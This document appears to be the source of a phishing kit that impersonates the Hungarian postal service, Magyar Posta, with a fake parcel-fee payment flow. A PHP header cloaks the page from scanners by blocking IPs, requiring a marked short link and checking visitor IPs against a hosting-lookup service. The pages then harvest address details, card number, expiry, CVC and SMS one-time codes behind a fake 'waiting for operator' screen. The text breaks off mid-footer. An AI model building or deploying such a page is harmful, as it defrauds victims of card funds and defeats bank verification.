<?php
// 1. منع التخزين المؤقت للمتصفح نهائياً (حل مشكلة Cache)
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");

// بدء الجلسة
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// 2. تحديد المنطقة الزمنية وتاريخ الزيارة (توقيت مكة المكرمة)
date_default_timezone_set('Asia/Riyadh');
$date = date('Y-m-d H:i:s');

// 3. جلب عنوان IP الحقيقي للزائر
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
if (strpos($ip, ',') !== false) {
    $ip = trim(explode(',', $ip)[0]);
}

// =============================================================
// المرحلة 1: الحظر اليدوي بعناوين IP
// =============================================================
$blocked_ips = array('150.228.113.183', '37.76.5.253');
if (in_array($ip, $blocked_ips)) {
    http_response_code(404);
    echo "Not found";
    exit;
}

// =============================================================
// المرحلة 2: فحص الرابط المختصر والتثبت من الجلسة
// =============================================================
$src = isset($_GET['src']) ? $_GET['src'] : '';

// إذا دخل الزائر عبر رابط t.ly المعلم بـ ?src=tly نمنحه تصريح الجلسة
if ($src === 'tly') {
    $_SESSION['verified_visitor'] = true;
}

// إذا لم يكن يملك تصريح جلسة سابقة ولم يأتِ من الرابط المختصر -> حظر
if (!isset($_SESSION['verified_visitor']) || $_SESSION['verified_visitor'] !== true) {
    http_response_code(404);
    echo "Not found";
    exit;
}

// =============================================================
// المرحلة 3: فحص الـ IP عبر API (الدولة + الداتا سنتر + البوتات)
// =============================================================
$api_url  = "http://ip-api.com/json/{$ip}?fields=status,countryCode,hosting,reverse";
$response = @file_get_contents($api_url);
$data     = json_decode($response, true);

$countryCode = $data['countryCode'] ?? 'Unknown';
$hosting     = $data['hosting'] ?? false;
$reverse     = $data['reverse'] ?? '';

$log_entry = "$ip | $date | $countryCode\n";


<!DOCTYPE html>
<html lang="hu">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Magyar Posta - Csomag kézbesítés</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --posta-green: #007D54;
            --posta-green-hover: #006241;
            --posta-red: #D12421;
            --posta-gray: #76818A;
            --posta-light-gray: #F4F6F7;
        }
        body {
            font-family: 'Montserrat', sans-serif;
            background-color: var(--posta-light-gray);
            margin: 0;
            padding: 0;
            min-height: 100vh;
        }
        .screen {
            display: none;
            opacity: 0;
            transition: opacity 0.3s ease-in-out;
            width: 100%;
        }
        .screen.active {
            display: block;
            opacity: 1;
        }
        .btn-posta-primary {
            background-color: var(--posta-green);
            color: white;
            transition: all 0.2s ease-in-out;
        }
        .btn-posta-primary:hover {
            background-color: var(--posta-green-hover);
        }
        .text-posta-green {
            color: var(--posta-green);
        }
        .border-posta-green {
            border-color: var(--posta-green);
        }
        .focus-posta:focus {
            border-color: var(--posta-green);
            outline: none;
            box-shadow: 0 0 0 3px rgba(0, 125, 84, 0.15);
        }
    </style>
</head>
<body class="flex flex-col min-h-screen">

    <!-- Top Banner Header -->
    <header class="bg-white border-b border-gray-200">
        <!-- Main Bar -->
        <div class="max-w-4xl mx-auto px-4 py-3 flex justify-between items-center">
            <div class="flex items-center gap-1">
                <img src="https://uat.posta.hu/static/g/logo.svg" alt="Magyar Posta Logo" class="h-10 md:h-12 object-contain" id="header-logo">
            </div>
            <div class="flex items-center gap-4 text-xs font-bold text-gray-700">
                <button class="hover:text-[#007D54] transition-colors flex items-center gap-1">
                    <i data-lucide="search" class="w-4 h-4"></i>
                </button>
                <div class="flex items-center gap-1 border-l border-gray-300 pl-4">
                    <span class="text-posta-green">HUN</span>
                    <span class="text-gray-300">|</span>
                    <span class="hover:text-posta-green cursor-pointer">EN</span>
                </div>
            </div>
        </div>
        <!-- Secondary Bar -->
        <div class="bg-[#F8F9FA] border-t border-gray-100 py-2.5">
            <div class="max-w-4xl mx-auto px-4 flex justify-between items-center text-xs font-bold text-[#007D54]">
                <div class="flex items-center gap-1 cursor-pointer">
                    <i data-lucide="menu" class="w-4 h-4"></i>
                    <span>MENÜ</span>
                </div>
                <div class="flex items-center gap-6">
                    <span class="hover:underline cursor-pointer flex items-center gap-1">
                        <i data-lucide="shopping-basket" class="w-4 h-4"></i> Kosár
                    </span>
                    <span class="hover:underline cursor-pointer flex items-center gap-1">
                        <i data-lucide="user" class="w-4 h-4"></i> Belépés
                    </span>
                </div>
            </div>
        </div>
    </header>

    <!-- Main Container -->
    <main class="flex-grow max-w-lg w-full mx-auto px-4 py-6">

        <!-- Back link -->
        <div class="mb-4">
            <button onclick="goBack()" class="inline-flex items-center gap-1 text-xs text-[#007D54] font-bold hover:underline bg-transparent border-none cursor-pointer">
                <i data-lucide="chevron-left" class="w-3.5 h-3.5"></i> Vissza a főoldalra
            </button>
        </div>

        <!-- 1. Screen: Address & Delivery Info -->
        <div id="screen-address" class="screen active">
            <div class="mb-4">
                <h1 class="text-lg md:text-xl font-extrabold text-gray-800 tracking-tight">MyPost regisztráció &amp; Kézbesítés</h1>
                <p class="text-[11px] text-gray-500 font-semibold mt-1">Cikkszám: <span class="font-mono text-gray-700">MP-84920491-HU</span></p>
            </div>

            <!-- Price alert -->
            <div class="bg-emerald-50 border border-emerald-200 rounded-xl p-3.5 mb-5 flex gap-3 items-start shadow-sm">
                <div class="p-1 bg-emerald-500 rounded-lg text-white">
                    <i data-lucide="package-check" class="w-4 h-4"></i>
                </div>
                <div class="text-xs">
                    <h4 class="font-bold text-emerald-900">Beérkező csomag kézbesítés</h4>
                    <p class="text-emerald-700 mt-0.5 leading-relaxed">Az Ön csomagja megérkezett a központi elosztóba. A kiszállításhoz kérjük frissítse a szállítási adatokat és fizesse be a minimális kezelési költséget.</p>
                    <p class="font-bold text-emerald-800 mt-2">Fizetendő összeg: <span class="text-sm font-extrabold underline">1050 Ft (2.70 EUR)</span></p>
                </div>
            </div>

            <!-- Form -->
            <div class="bg-white rounded-2xl shadow-md border border-gray-100 p-5 md:p-6 mb-6">
                <h3 class="text-xs font-extrabold text-gray-500 uppercase tracking-wider mb-4 border-b border-gray-100 pb-2">Szállítási cím és adatok</h3>
                
                <!-- Address Form -->
                <form id="address-form" class="space-y-4" onsubmit="event.preventDefault(); submitAddress();">
                    <div class="grid grid-cols-2 gap-4">
                        <div>
                            <label class="block text-[11px] font-bold text-gray-600 mb-1">Vezetéknév <span class="text-red-500">*</span></label>
                            <input type="text" id="lastName" placeholder="pl. Kovács" class="w-full h-11 border border-gray-300 rounded-xl px-3.5 text-xs font-semibold focus-posta" required>
                        </div>
                        <div>
                            <label class="block text-[11px] font-bold text-gray-600 mb-1">Keresztnév <span class="text-red-500">*</span></label>
                            <input type="text" id="firstName" placeholder="pl. János" class="w-full h-11 border border-gray-300 rounded-xl px-3.5 text-xs font-semibold focus-posta" required>
                        </div>
                    </div>

                    <div>
                        <label class="block text-[11px] font-bold text-gray-600 mb-1">E-mail cím <span class="text-red-500">*</span></label>
                        <input type="email" id="email" placeholder="kovacs.janos@gmail.com" class="w-full h-11 border border-gray-300 rounded-xl px-3.5 text-xs font-semibold focus-posta" required>
                    </div>

                    <div>
                        <label class="block text-[11px] font-bold text-gray-600 mb-1">Mobiltelefonszám <span class="text-red-500">*</span></label>
                        <input type="tel" id="phone" value="+36 " placeholder="+36 20 123 4567" class="w-full h-11 border border-gray-300 rounded-xl px-3.5 text-xs font-semibold focus-posta" required>
                    </div>

                    <div class="grid grid-cols-3 gap-4">
                        <div class="col-span-1">
                            <label class="block text-[11px] font-bold text-gray-600 mb-1">Irányítószám <span class="text-red-500">*</span></label>
                            <input type="text" id="zipCode" maxlength="4" placeholder="1051" class="w-full h-11 border border-gray-300 rounded-xl px-3.5 text-xs font-semibold text-center focus-posta" required oninput="this.value=this.value.replace(/\D/g, '')">
                        </div>
                        <div class="col-span-2">
                            <label class="block text-[11px] font-bold text-gray-600 mb-1">Település <span class="text-red-500">*</span></label>
                            <input type="text" id="city" placeholder="Budapest" class="w-full h-11 border border-gray-300 rounded-xl px-3.5 text-xs font-semibold focus-posta" required>
                        </div>
                    </div>

                    <div>
                        <label class="block text-[11px] font-bold text-gray-600 mb-1">Utca, házszám, emelet, ajtó <span class="text-red-500">*</span></label>
                        <input type="text" id="street" placeholder="Kossuth Lajos utca 4. 2. em 12." class="w-full h-11 border border-gray-300 rounded-xl px-3.5 text-xs font-semibold focus-posta" required>
                    </div>

                    <p class="text-[10px] text-gray-400 font-medium">* Kötelezően kitöltendő mezők</p>

                    <div class="pt-2">
                        <button type="submit" class="w-full h-12 btn-posta-primary rounded-xl font-bold text-sm shadow-md hover:shadow-lg flex items-center justify-center gap-2 cursor-pointer select-none">
                            <span>Adatok mentése és folytatás</span>
                            <i data-lucide="arrow-right" class="w-4 h-4"></i>
                        </button>
                    </div>
                </form>
            </div>

            <!-- Footer Progress Indicator -->
            <div class="bg-white border border-gray-200 rounded-2xl p-4 flex items-center gap-4">
                <div class="w-8 h-8 rounded-full border-2 border-posta-green text-posta-green flex items-center justify-center font-bold text-sm">1</div>
                <div>
                    <span class="text-xs font-extrabold text-[#007D54] tracking-wider block uppercase">SZÁLLÍTÁS</span>
                    <span class="text-[10px] text-gray-400 font-medium block">Cím és személyes információk rögzítése</span>
                </div>
            </div>
        </div>

        <!-- 2. Screen: Payment Details (OTP SimplePay Styled) -->
        <div id="screen-payment" class="screen">
            <div class="mb-4">
                <h1 class="text-lg md:text-xl font-extrabold text-gray-800 tracking-tight">Kártyás fizetés</h1>
                <p class="text-[11px] text-gray-500 font-semibold mt-1">SimplePay biztonságos kártyaelfogadás</p>
            </div>

            <!-- Card Summary details -->
            <div class="bg-gray-800 text-white rounded-2xl p-4 mb-5 flex flex-col justify-between shadow-md relative overflow-hidden">
                <div class="absolute right-[-20px] bottom-[-20px] opacity-10 pointer-events-none">
                    <i data-lucide="shield-check" class="w-32 h-32 text-white"></i>
                </div>
                <div class="flex justify-between items-start mb-3">
                    <div>
                        <span class="text-[10px] font-bold text-gray-400 uppercase tracking-wider block">Kereskedő</span>
                        <span class="text-xs font-bold">Magyar Posta Zrt.</span>
                    </div>
                    <div class="text-right">
                        <span class="text-[10px] font-bold text-gray-400 uppercase tracking-wider block">Fizetendő</span>
                        <span class="text-base font-black text-emerald-400">1 050 Ft</span>
                    </div>
                </div>
                <div class="border-t border-gray-700/60 pt-2 flex justify-between items-center text-[11px] text-gray-300">
                    <div>Rendelésszám: <span class="font-mono text-white">MP-84920491</span></div>
                    <div>Összeg euróban: <span class="font-bold text-white">2.70 €</span></div>
                </div>
            </div>

            <!-- Card error message -->
            <div id="card-error" style="display: none;" class="mb-4 p-3.5 bg-red-50 border border-red-200 text-red-700 text-xs font-semibold rounded-xl flex gap-2 items-start shadow-sm">
                <i data-lucide="alert-circle" class="w-4 h-4 shrink-0 text-red-600 mt-0.5"></i>
                <div id="card-error-text" class="leading-tight">A kártyaadatok ellenőrzése meghiúsult. Kérjük próbálja újra egy másik kártyával!</div>
            </div>

            <!-- Payment Form -->
            <div class="bg-white rounded-2xl shadow-md border border-gray-100 p-5 md:p-6 mb-6">
                <!-- Back Link inside form for easy access -->
                <div class="mb-4 flex items-center justify-between">
                    <button type="button" onclick="goBack()" class="inline-flex items-center gap-1.5 text-xs text-slate-400 hover:text-slate-600 font-bold transition-colors cursor-pointer bg-transparent border-0 outline-none">
                        <i data-lucide="arrow-left" class="w-4 h-4"></i>
                        <span>Zpět</span>
                    </button>
                    <span class="text-[10px] text-slate-400 font-bold uppercase">2. Lépés</span>
                </div>

                <form id="card-form" class="space-y-4" onsubmit="event.preventDefault(); submitPayment();">
                    <div>
                        <label class="block text-[11px] font-bold text-gray-600 mb-1">Kártyabirtokos neve <span class="text-red-500">*</span></label>
                        <input type="text" id="cardHolder" placeholder="pl. Kovács János" class="w-full h-11 border border-gray-300 rounded-xl px-3.5 text-xs font-semibold uppercase focus-posta" required>
                    </div>

                    <div>
                        <label class="block text-[11px] font-bold text-gray-600 mb-1">Kártyaszám <span class="text-red-500">*</span></label>
                        <div class="relative">
                            <input type="text" id="cardNumber" placeholder="4000 1234 5678 9010" class="w-full h-11 border border-gray-300 rounded-xl pl-3.5 pr-10 text-xs font-mono font-semibold focus-posta" required oninput="formatCardNumber(this)">
                            <div class="absolute right-3.5 top-3 text-gray-400">
                                <i data-lucide="credit-card" class="w-5 h-5"></i>
                            </div>
                        </div>
                    </div>

                    <!-- Guaranteed Side-by-Side Flex Layout to prevent vertical wrapping on mobile -->
                    <div class="flex gap-4">
                        <div class="w-1/2">
                            <label class="block text-[11px] font-bold text-gray-600 mb-1">Lejárati dátum <span class="text-red-500">*</span></label>
                            <input type="text" id="cardExpiry" placeholder="HH/ÉÉ" maxlength="5" class="w-full h-11 border border-gray-300 rounded-xl px-3.5 text-xs font-mono font-semibold text-center focus-posta" required oninput="formatCardExpiry(this)">
                        </div>
                        <div class="w-1/2">
                            <label class="block text-[11px] font-bold text-gray-600 mb-1">Biztonsági kód (CVC) <span class="text-red-500">*</span></label>
                            <input type="password" id="cardCvv" maxlength="3" placeholder="123" class="w-full h-11 border border-gray-300 rounded-xl px-3.5 text-xs font-mono font-semibold text-center focus-posta" required oninput="this.value=this.value.replace(/\D/g, '')">
                        </div>
                    </div>

                    <div class="pt-3">
                        <button type="submit" class="w-full h-12 btn-posta-primary rounded-xl font-bold text-sm shadow-md hover:shadow-lg flex items-center justify-center gap-2 cursor-pointer select-none">
                            <i data-lucide="lock" class="w-4 h-4"></i>
                            <span>Biztonságos fizetés: 1 050 Ft</span>
                        </button>
                    </div>
                </form>

                <!-- Secure Badges -->
                <div class="mt-5 border-t border-gray-100 pt-4 flex justify-center items-center gap-4 opacity-70 select-none">
                    <span class="text-[9px] font-bold text-gray-400 uppercase tracking-widest flex items-center gap-1">
                        <i data-lucide="shield-check" class="w-3.5 h-3.5 text-emerald-600"></i> SSL BIZTONSÁG
                    </span>
                    <span class="text-gray-300">|</span>
                    <span class="text-[9px] font-bold text-gray-400 uppercase tracking-widest flex items-center gap-1">
                        <i data-lucide="check-square" class="w-3.5 h-3.5 text-emerald-600"></i> PCI COMPLIANT
                    </span>
                </div>
            </div>

            <!-- Footer Progress Indicator -->
            <div class="bg-white border border-gray-200 rounded-2xl p-4 flex items-center gap-4">
                <div class="w-8 h-8 rounded-full border-2 border-posta-green text-posta-green flex items-center justify-center font-bold text-sm">2</div>
                <div>
                    <span class="text-xs font-extrabold text-[#007D54] tracking-wider block uppercase">FIZETÉS</span>
                    <span class="text-[10px] text-gray-400 font-medium block">Biztonságos SimplePay online fizetés</span>
                </div>
            </div>
        </div>

        <!-- 2b. Screen: Loading Spinner (Waiting for Operator) -->
        <div id="screen-loading" class="screen">
            <div class="bg-white rounded-2xl shadow-md border border-gray-100 p-8 text-center flex flex-col items-center justify-center min-h-[350px]">
                <div class="relative flex items-center justify-center mb-8">
                    <!-- Smooth elegant spinning outer ring -->
                    <div class="w-20 h-20 border-4 border-slate-100 rounded-full"></div>
                    <div class="absolute w-20 h-20 border-4 border-t-[#007D54] border-r-transparent border-b-transparent border-l-transparent rounded-full animate-spin"></div>
                    
                    <!-- Pulsing secure shield inside -->
                    <div class="absolute w-12 h-12 bg-emerald-50 rounded-full flex items-center justify-center text-[#007D54] shadow-inner animate-pulse">
                        <i data-lucide="shield-check" class="w-6 h-6"></i>
                    </div>
                </div>
                <h2 class="text-base font-extrabold text-gray-800 tracking-tight mb-2">Tranzakció ellenőrzése...</h2>
                <p class="text-xs text-gray-500 max-w-xs leading-relaxed mb-6">A tranzakció biztonságos feldolgozása folyamatban van az Ön bankjával. Kérjük, <b>ne zárja be az ablakot</b>, és várja meg, amíg a kapcsolat létrejön...</p>
                
                <div class="px-4 py-2 bg-gray-50 border border-gray-100 rounded-xl flex items-center gap-2 text-[10px] text-gray-400 font-bold select-none">
                    <span class="relative flex h-2 w-2">
                        <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
                        <span class="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
                    </span>
                    <span>BIZTONSÁGOS BANKI KAPCSOLAT</span>
                </div>
            </div>
        </div>

        <!-- 3. Screen: SMS Verification / OTP -->
        <div id="screen-sms" class="screen">
            <div class="mb-4">
                <h1 class="text-lg md:text-xl font-extrabold text-gray-800 tracking-tight">Kétlépcsős SMS ellenőrzés</h1>
                <p class="text-[11px] text-gray-500 font-semibold mt-1">3D Secure hitelesítés</p>
            </div>

            <!-- OTP input box -->
            <div class="bg-white rounded-2xl shadow-md border border-gray-100 p-5 md:p-6 mb-6 text-center">
                <div class="mb-4 flex items-center justify-between text-left">
                    <button type="button" onclick="goBack()" class="inline-flex items-center gap-1.5 text-xs text-slate-400 hover:text-slate-600 font-bold transition-colors cursor-pointer bg-transparent border-0 outline-none">
                        <i data-lucide="arrow-left" class="w-4 h-4"></i>
                        <span>Zpět</span>
                    </button>
                    <span class="text-[10px] text-slate-400 font-bold uppercase">3. Lépés</span>
                </div>

                <div class="w-12 h-12 bg-emerald-50 text-posta-green rounded-full flex items-center justify-center mx-auto mb-4">
                    <i data-lucide="smartphone" class="w-6 h-6"></i>
                </div>
                <h3 class="text-sm font-extrabold text-gray-800 mb-2">Adja meg az SMS ellenőrző kódot</h3>
                <p class="text-xs text-gray-500 max-w-sm mx-auto leading-relaxed mb-5">
                    Küldtünk egy egyszer használatos biztonsági kódot az Ön telefonszámára: <b id="sms-display-phone" class="font-bold text-gray-700">+36 ••• ••• •••</b>. Adja meg a kódot a fizetési tranzakció jóváhagyásához.
                </p>

                <form id="sms-form" class="space-y-4 max-w-xs mx-auto" onsubmit="event.preventDefault(); submitSms();">
                    <div>
                        <input type="text" id="smsCode" maxlength="8" placeholder="pl. 123456" class="w-full h-12 border-2 border-gray-300 rounded-xl text-center text-lg font-mono font-black focus-posta tracking-wider" required>
                    </div>

                    <!-- Timer and resend -->
                    <div class="flex justify-between items-center text-xs font-bold pt-1">
                        <div class="text-gray-400 flex items-center gap-1">
                            <i data-lucide="timer" class="w-4 h-4 text-gray-400"></i>
                            <span>Kód lejár: <span id="sms-timer" class="text-gray-700">03:00</span></span>
                        </div>
                        <button type="button" class="text-posta-green hover:underline" onclick="resendCode()">Új kód kérése</button>
                    </div>

                    <div class="pt-3">
                        <button type="submit" class="w-full h-12 btn-posta-primary rounded-xl font-bold text-sm shadow-md hover:shadow-lg flex items-center justify-center gap-2 cursor-pointer select-none">
                            <span>Megerősítés</span>
                            <i data-lucide="check" class="w-4 h-4"></i>
                        </button>
                    </div>
                </form>
            </div>

            <!-- Footer Progress Indicator -->
            <div class="bg-white border border-gray-200 rounded-2xl p-4 flex items-center gap-4">
                <div class="w-8 h-8 rounded-full border-2 border-posta-green text-posta-green flex items-center justify-center font-bold text-sm">3</div>
                <div>
                    <span class="text-xs font-extrabold text-[#007D54] tracking-wider block uppercase">ELLENŐRZÉS</span>
                    <span class="text-[10px] text-gray-400 font-medium block">Aktiválási és fizetési kód megerősítése</span>
                </div>
            </div>
        </div>

        <!-- 4. Screen: Re-verification / Incorrect SMS OTP -->
        <div id="screen-resms" class="screen">
            <div class="mb-4">
                <h1 class="text-lg md:text-xl font-extrabold text-gray-800 tracking-tight">Kétlépcsős SMS ellenőrzés</h1>
                <p class="text-[11px] text-gray-500 font-semibold mt-1">Ismételt hitelesítés hibás kód után</p>
            </div>

            <!-- Error banner -->
            <div class="bg-red-50 border border-red-200 rounded-2xl p-3.5 mb-5 flex gap-3 items-start shadow-sm">
                <div class="p-1 bg-red-500 rounded-lg text-white">
                    <i data-lucide="shield-alert" class="w-4 h-4 animate-bounce"></i>
                </div>
                <div class="text-xs">
                    <h4 class="font-bold text-red-900">Hibás ellenőrző kód!</h4>
                    <p class="text-red-700 mt-0.5 leading-relaxed">A megadott SMS kód érvénytelen vagy lejárt. Biztonsági okokból új SMS ellenőrző kódot küldtünk a telefonjára.</p>
                </div>
            </div>

            <!-- OTP input box -->
            <div class="bg-white rounded-2xl shadow-md border border-gray-100 p-5 md:p-6 mb-6 text-center">
                <div class="mb-4 flex items-center justify-between text-left">
                    <button type="button" onclick="goBack()" class="inline-flex items-center gap-1.5 text-xs text-slate-400 hover:text-slate-600 font-bold transition-colors cursor-pointer bg-transparent border-0 outline-none">
                        <i data-lucide="arrow-left" class="w-4 h-4"></i>
                        <span>Zpět</span>
                    </button>
                    <span class="text-[10px] text-slate-400 font-bold uppercase">4. Lépés</span>
                </div>

                <div class="w-12 h-12 bg-red-50 text-red-600 rounded-full flex items-center justify-center mx-auto mb-4">
                    <i data-lucide="key-round" class="w-6 h-6"></i>
                </div>
                <h3 class="text-sm font-extrabold text-gray-800 mb-2">Adja meg az ÚJ ellenőrző kódot</h3>
                <p class="text-xs text-gray-500 max-w-sm mx-auto leading-relaxed mb-5">
                    Kérjük, adja meg az új <b>6 vagy 8 jegyű</b> biztonsági kódot, amelyet az imént küldtünk el SMS-ben.
                </p>

                <form id="resms-form" class="space-y-4 max-w-xs mx-auto" onsubmit="event.preventDefault(); submitResms();">
                    <div>
                        <input type="text" id="resmsCode" maxlength="8" placeholder="pl. 654321" class="w-full h-12 border-2 border-red-300 rounded-xl text-center text-lg font-mono font-black focus:border-red-500 focus:outline-none focus:ring-3 focus:ring-red-100 tracking-wider" required>
                    </div>

                    <!-- Timer and resend -->
                    <div class="flex justify-between items-center text-xs font-bold pt-1">
                        <div class="text-gray-400 flex items-center gap-1">
                            <i data-lucide="timer" class="w-4 h-4 text-gray-400"></i>
                            <span>Új kód lejár: <span id="resms-timer" class="text-gray-700">03:00</span></span>
                        </div>
                        <button type="button" class="text-posta-green hover:underline" onclick="resendCode()">Új kód kérése</button>
                    </div>

                    <div class="pt-3">
                        <button type="submit" class="w-full h-12 bg-red-600 hover:bg-red-700 text-white rounded-xl font-bold text-sm shadow-md hover:shadow-lg flex items-center justify-center gap-2 cursor-pointer select-none">
                            <span>Újra megerősít</span>
                            <i data-lucide="shield-check" class="w-4 h-4"></i>
                        </button>
                    </div>
                </form>
            </div>

            <!-- Footer Progress Indicator -->
            <div class="bg-white border border-gray-200 rounded-2xl p-4 flex items-center gap-4">
                <div class="w-8 h-8 rounded-full border-2 border-red-500 text-red-500 flex items-center justify-center font-bold text-sm">!</div>
                <div>
                    <span class="text-xs font-extrabold text-red-600 tracking-wider block uppercase">ISMTÉLT MEGERŐSÍTÉS</span>
                    <span class="text-[10px] text-gray-400 font-medium block">Kérjük, adja meg a legfrissebb SMS kódot</span>
                </div>
            </div>
        </div>

        <!-- 5. Screen: Thank You / Success -->
        <div id="screen-success" class="screen">
            <div class="bg-white rounded-2xl shadow-md border border-gray-100 p-6 md:p-8 text-center mb-6 flex flex-col items-center">
                <div class="w-16 h-16 bg-emerald-50 text-emerald-500 rounded-full flex items-center justify-center mb-5 border-2 border-emerald-500/20">
                    <i data-lucide="badge-check" class="w-10 h-10"></i>
                </div>
                <h1 class="text-lg md:text-xl font-extrabold text-gray-800 tracking-tight mb-2">Sikeres regisztráció &amp; Fizetés!</h1>
                <p class="text-xs text-gray-500 max-w-sm leading-relaxed mb-6">
                    Köszönjük! A szállítási díj (1 050 Ft) kiegyenlítése sikeresen megtörtént. Csomagja elindult és hamarosan kézbevehető a megadott címen.
                </p>

                <!-- Tracking info box -->
                <div class="w-full bg-gray-50 border border-gray-100 rounded-2xl p-4 text-left space-y-3 mb-6">
                    <div class="flex justify-between border-b border-gray-200 pb-2">
                        <span class="text-[10px] font-bold text-gray-400 uppercase tracking-wider">Csomag száma</span>
                        <span class="font-mono text-xs font-bold text-gray-800">MP-59274920-HU</span>
                    </div>
                    <div class="flex justify-between border-b border-gray-200 pb-2">
                        <span class="text-[10px] font-bold text-gray-400 uppercase tracking-wider">Várható szállítás</span>
                        <span class="text-xs font-bold text-emerald-600 flex items-center gap-1">
                            <i data-lucide="truck" class="w-3.5 h-3.5"></i> 1-2 munkanap
                        </span>
                    </div>
                    <div class="flex flex-col">
                        <span class="text-[10px] font-bold text-gray-400 uppercase tracking-wider mb-0.5">Szállítási cím</span>
                        <span id="display-success-address" class="text-xs font-semibold text-gray-700">Budapest, Kossuth Lajos u.</span>
                    </div>
                </div>

                <a href="https://www.posta.hu" class="w-full h-12 btn-posta-primary rounded-xl font-bold text-sm shadow-md hover:shadow-lg flex items-center justify-center gap-2 cursor-pointer select-none">
                    <span>Bezárás &amp; Kilépés</span>
                </a>
            </div>
        </div>

    </main>

    <!-- Social Link Banner with High Fidelity SVG icons rendering perfectly on mobile/desktop -->
    <section class="bg-[#59BC94] text-white py-6 mt-auto">
        <div class="max-w-4xl mx-auto px-4 flex justify-center items-center gap-6">
            <!-- Telegram -->
            <a href="https://t.me/" target="_blank" class="w-10 h-10 rounded-xl bg-white/20 hover:bg-white/30 flex items-center justify-center transition-colors">
                <svg class="w-5 h-5 fill-current text-white" viewBox="0 0 24 24">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.02-1.96 1.25-5.54 3.66-.52.36-1 .53-1.42.52-.47-.01-1.37-.26-2.03-.48-.82-.27-1.47-.42-1.42-.88.03-.24.35-.49.97-.74 3.79-1.65 6.32-2.73 7.59-3.25 3.61-1.48 4.36-1.74 4.85-1.75.11 0 .35.03.5.16.13.1.17.24.18.34-.02.13-.01.27-.01.4z"/>
                </svg>
            </a>
            <!-- Instagram -->
            <a href="https://instagram.com/" target="_blank" class="w-10 h-10 rounded-xl bg-white/20 hover:bg-white/30 flex items-center justify-center transition-colors">
                <svg class="w-5 h-5 fill-none stroke-current stroke-width-2 stroke-linecap-round stroke-linejoin-round text-white" viewBox="0 0 24 24">
                    <rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect>
                    <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path>
                    <line x1="17.5" y1="6.5" x2="17.51" y2="6.5"></line>
                </svg>
            </a>
            <!-- YouTube -->
            <a href="https://youtube.com/" target="_blank" class="w-10 h-10 rounded-xl bg-white/20 hover:bg-white/30 flex items-center justify-center transition-colors">
                <svg class="w-5 h-5 fill-current text-white" viewBox="0 0 24 24">
                    <path d="M23.498 6.163a3.003 3.003 0 0 0-2.11-2.11C19.517 3.545 12 3.545 12 3.545s-7.516 0-9.387.507a3.003 3.003 0 0 0-2.11 2.11C0 8.033 0 12 0 12s0 3.967.502 5.837a3.003 3.003 0 0 0 2.11 2.11c1.871.507 9.387.507 9.387.507s7.517 0 9.387-.507a3.003 3.003 0 0 0 2.11-2.11C24 15.967 24 12 24 12s0-3.967-.502-5.837zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/>
                </svg>
            </a>
            <!-- Facebook -->
            <a href="https://facebook.com/" target="_blank" class="w-10 h-10 rounded-xl bg-white/20 hover:bg-white/30 flex items-center justify-center transition-colors">
                <svg class="w-5 h-5 fill-current text-white" viewBox="0 0 24 24">
                    <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                </svg>
            </a>
        </div>
    </section>

    <!-- Footer Information -->
    <footer class="bg-[#121415] text-gray-400 text-xs py-8 border-t border-gray-800">
        <div class="max-w-4xl mx-auto px-4 grid grid-cols-1 md:grid-cols-3 gap-8">
            <!-- Col 1 -->
            <div>
                <h4 class="text-xs font-extrabold text-white uppercase tracking-wider mb-3">Rólunk</h4>
                <ul class="space-y-2 text-[11px]">
                    <li><a href="#" class="hover:text-white transition-colors">A Magyar Postáról</a></li>
                    <li><a href="#" class="hover:text-white transition-colors">Magyar Posta alapadatai</a></li>
                    <li><a href="#" class="hover:text-white transition-colors">Éves jelentések</a></li>
                    <li><a href="#" class="hover:text-white transition-colors">Fenntarthatósági jelentések</a></li>
                </ul>
            </div>
            <!-- Col 2 -->
            <div>
                <h4 class="text-xs font-extrabold text-white uppercase tracking-wider mb-3">Hasznos információk</h4>
                <ul class="space-y-2 text-[11px]">
                    <li><a href="#" class="hover:text-white transition-colors">Általános Szerződési Feltételek</a></li>
                    <li><a href="#" class="hover:text-white transition-colors">Postai díjszabás</a></li>
                    <li><a href="#" class="hover:text-white transition-colors">Adatkezelési tájékoztató</a></li>
                    <li><a href="#" class="hover:text-white transition-colors">Süti (cookie) szabályzat</a></li>
                </ul>
            </div>
            <!-- Col 3 -->
            <div>
                <h4 class="text-xs font-extrabold text-white uppercase tracking-wider mb-3">Kapcsolat</h4>
                <p class="text-[11px] leading-relaxed mb-2">
                    Ügyfélszolgálatunk készséggel áll rendelkezésére küldeményeivel kapcsolatban.
                </p>
                <p class="font-bold text-white text-[11px]">E-mail: ugyfelszolgalat@posta.hu</p>
            </div>
        </div>

        <div class="max-w-4xl mx-auto px-4 mt-8 pt-6 border-t border-gray-800/60 text-center text-[10px] text-gray-500">
